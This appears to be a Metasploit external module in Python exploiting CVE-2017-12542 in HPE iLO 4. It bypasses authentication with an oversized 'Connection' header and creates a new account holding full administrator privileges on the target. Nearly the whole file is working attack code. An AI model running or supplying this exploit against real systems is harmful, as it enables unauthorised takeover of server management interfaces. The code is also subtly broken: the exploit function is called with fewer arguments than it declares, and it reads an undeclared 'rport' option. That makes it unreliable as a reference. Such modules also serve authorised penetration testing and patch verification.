#!/usr/bin/env python

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
import urllib3

from metasploit import module

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

metadata = {
    'name': 'HPE iLO4 Add New Administrator User',

    'description': '''A vulnerability in HPE Integrated Lights-Out 4 (iLO 4) could allow an unauthenticated, 
    remote attacker to bypass authentication and execute arbitrary code. The vulnerability is due to an unspecified 
    condition that exists within the affected software. An attacker could exploit this vulnerability to bypass 
    authentication and execute arbitrary code. A successful exploit could result in a complete system compromise. ''',
    'authors': [
        'skelsec',  # Vulnerability disclosure
        'bluebird',  # Metasploit external module (Python)
    ],
    'date': '2018-02-09',
    'references': [
        {'type': 'cve', 'ref': 'CVE-2017-12542'},
        {'type': 'url', 'ref': 'https://www.exploit-db.com/exploits/44005/'},
    ],
    'type': 'scanner.single',
    'options': {
        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
        'username': {'type': 'string', 'description': 'add user name', 'required': True, 'default': 'msf'},
        'password': {'type': 'string', 'description': 'add user password', 'required': True, 'default': 'metasploit'},
    }}


def exploit(ip, port, username, password):
    exploit_trigger = {'Connection': 'A' * 29}
    accounts_url = 'https://%s/rest/v1/AccountService/Accounts'
    Oem = {
        'Hp': {
            'LoginName': username,
            'Privileges': {
                'LoginPriv': True,
                'RemoteConsolePriv': True,
                'UserConfigPriv': True,
                'VirtualMediaPriv': True,
                'iLOConfigPriv': True,
                'VirtualPowerAndResetPriv': True,
            }
        }
    }
    body = {
        'UserName': username,
        'Password': password,
        'Oem': Oem
    }
    url = accounts_url % ip

    try:
        response = requests.post(url, json=body, headers=exploit_trigger, verify=False)
    except Exception as e:
        return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))

    if response.status_code in [requests.codes.ok, requests.codes.created]:
        return True, response.text
    else:
        return False, 'Server returned status code %d, data: %s' % (response.status_code, response.text)


def run(args):
    module.log('start exploit')
    ret, data = exploit(args['rhost'], args['username'], args['password'])
    if ret:
        module.log('Sucsessfully added user!')
        module.report_vuln(args['rhost'], 'Add New Administrator User', port=args['rport'], )
    else:
        module.log('Error! {msg}'.format(msg=data))


if __name__ == "__main__":
    module.run(metadata, run)
